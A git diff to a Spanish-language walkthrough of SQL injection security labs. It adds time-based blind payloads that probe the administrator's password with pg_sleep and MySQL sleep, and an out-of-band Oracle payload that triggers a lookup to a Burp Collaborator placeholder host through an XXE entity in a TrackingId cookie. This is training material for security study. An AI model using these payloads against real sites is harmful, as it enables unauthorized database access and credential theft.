@@ -674,7 +674,9 @@ Para resolver el laboratorio, inicie sesión como administrator usuario.
 
 2º Como hemos visto que la base de datos es posgresSQL podemos usar las sentencias de porque hemos  SELECT CASE WHEN(se hace la comparación) y se pone el delay de esta forma 
 podemos saber los caracteres de la contraseña.
+```
 TrackingId=test'%3b SELECT CASE WHEN (username='administrator' and length(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- 
+```
 
 
 un script para automatizar el proceso como los ejemplos anteriores puede ser esos:
@@ -775,6 +777,29 @@ En el caso de que fuera MySQL podemos probar alternativas en la sentencias porqu
 Algo equivalente sería:
 ```
 select username from users where id='1' and if(substr((select password from users where username='administrator'),1,1)='a',sleep(5),sleep(0))-- -
+```
+
+## Reto 16: Inyección SQL ciega con interacción fuera de banda (OBB)
+
+Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
+
+La consulta SQL se ejecuta de forma asíncrona y no afecta la respuesta de la aplicación. Sin embargo, se pueden activar interacciones fuera de banda con un dominio externo.
+
+Para resolver el laboratorio, explote la vulnerabilidad de inyección SQL para provocar una búsqueda de DNS en Burp Collaborator. 
+
+1º Probar que se le puede hacer una inyección SQL de cualquier tipo usando, es decir los ejemplos que hemos visto anteriormente.
+
+```
+' order by 2 -- -
+```
+
+2º plantear consultas al DNS, usando el cheet sheet podemos probar para la consulta al DNS de oracle. 
+```
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+Si lo adaptamos a nuestro ejemplo los carateres complicado tenemos que url encoderarlos y tenemos que usar burpsuite collaborator para que no salga el "Internal Server Error" obtenemos un código 200 si se hace de manera correcta.
+```
+TrackingId=test' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual
 ```
 
 
